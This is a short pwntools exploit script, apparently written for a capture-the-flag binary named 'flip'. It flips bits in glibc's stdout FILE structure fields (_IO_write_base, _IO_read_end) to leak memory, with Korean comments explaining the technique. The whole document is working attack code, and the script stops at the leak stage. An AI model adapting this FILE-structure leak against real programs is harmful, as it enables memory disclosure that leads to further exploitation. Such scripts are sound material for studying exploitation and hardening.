from pwn import *

# p = remote("localhost", 31165, level="debug")
p = process('./flip')
e = ELF('./flipma', checksec=False)
libc = ELF('./libc.so.6')

# stdin and stdout offset
stdout_offset = libc.sym._IO_2_1_stdout_ - libc.sym._IO_2_1_stdin_
# stdout_offset = 0xd20
print(hex(stdout_offset))
# frist puts because we have to get _IO_CURRENTLY_PUTTING
p.sendlineafter(b"a: ", b"1234")
p.sendlineafter(b"b: ", b"1234")
 
# overwrite _IO_read_end and _IO_write_base
# _IO_write_base에 5번째 bit를 flip시켜 큰 값으로 변경하여 출력 값을 확장시킴
# _IO_read_end 포인터도 _IO_write_base와 동일하게 변경해주어야 new_do_write 함수에서
# lseek 시스템 콜이 호출되지 않도록 함 
# +1을 해주는 이유는 a에서 _IO_read_end에 주소값을 바이트 단위로 참조를 하기 때문에
# 시작 바이트가 아닌 . 두번째 바이트를 참조하도록 하기 위해서 +1을 해주었음(주소값은 8바이트)
p.sendlineafter(b"a: ", str(stdout_offset+0x10+1).encode())
p.sendlineafter(b"b: ", b"5")
p.sendlineafter(b"a: ", str(stdout_offset+0x20+1).encode())
p.sendlineafter(b"b: ", b"5")
pause()
# memory leak
p.sendlineafter(b"a: ", b"1234")
p.sendlineafter(b"b: ", b"1234")
pause()
leak = p.recvuntil(b"we' re")
print(leak)